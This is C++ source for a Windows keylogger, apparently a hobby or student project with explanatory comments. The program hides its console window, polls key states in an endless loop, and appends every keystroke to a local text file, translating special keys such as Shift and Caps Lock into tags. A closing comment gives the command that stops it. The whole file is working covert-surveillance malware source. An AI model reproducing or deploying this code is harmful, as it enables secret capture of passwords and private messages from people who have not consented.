// KeyLogger.cpp - Vedanshee Patel

#include <iostream>
#include <fstream>
#include <windows.h>


//Create the Log file 
#define LOG_FILE "keylogger.txt"

//Save data into log file
void saveData(std::string data) {
    std::fstream logFile;

    //open file 
    //ios::app allows adding data to the end of the file (appends the new data instead of replacing the content)
    logFile.open(LOG_FILE, std::ios::app);

    //Write data into log file
    logFile << data;

    //Close file 
    logFile.close();
}

std::string translateSpecialKey(int key) {
    std::string result;

    //basic keys 
    switch (key)
    {
    case VK_SPACE:
        //Space key input
        result = " ";
        break;
    case VK_RETURN:
        //enter key
        result = "\n";
            break;
    case VK_BACK:
        //back key 
        result = "\b";
        break;
    case VK_CAPITAL:
        //capslock key 
        result = "[CAPS_LOCK]";
        break;
    case VK_SHIFT:
        //shift key
        result = "[SHIFT]";
        break;
    case VK_TAB:
        //tab key 
        result = "[TAB]";
        break;
    case VK_CONTROL:
        //control key 
        result = "[CTRL]";
        break;
    case VK_MENU:
        //ALT Key 
        result = "[ALT]";
            break;
    case VK_UP:
        //up arrow key 
        result = "[UP]";
        break;
    case VK_DOWN:
        //down arrow key 
        result = "[DOWN]";
        break;
    case VK_OEM_PERIOD:
        //period/fullstop key 
        result = ".";
        break;
    default:
        break;

    }
    return result;


}

int main() {

    //make array of the special keys 
    int specialKeyArray[] = { VK_BACK, VK_CAPITAL, VK_CONTROL ,VK_MENU, VK_RETURN, VK_SHIFT, VK_SPACE, VK_TAB, VK_UP, VK_DOWN,VK_OEM_PERIOD };

    std::string specialKeyChar;
    bool isSpecialKey;


    //hide terminal window
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    //loop 

    while (true) {
        //loop through each key 
        for (int key = 8; key <= 190; key++) {
            //check is key pressed
            if (GetAsyncKeyState(key) == -32767) {
                //if key is pressed
                //check if key is special key 
                isSpecialKey = std::find(std::begin(specialKeyArray), std::end(specialKeyArray), key) != std::end(specialKeyArray);
                if (isSpecialKey) {
                    //This is a special key, so needs to be translated
                    specialKeyChar = translateSpecialKey(key);

                    //save data
                    saveData(specialKeyChar);
                }
                else {
                    //This is not a special key, so check if it is upper or lower case

                    if (GetKeyState(VK_CAPITAL)) {
                        //capslock is on
                        saveData(std::string(1, (char)key));
                    }
                    else {
                        //capslock off
                        //make character into lowercase before saving 
                        saveData(std::string(1, std::tolower(key)));
                    }
                }
            }
        }
    }

    return 0;

}
//To terminate: cmd taskkill /F /IM keylogger.exe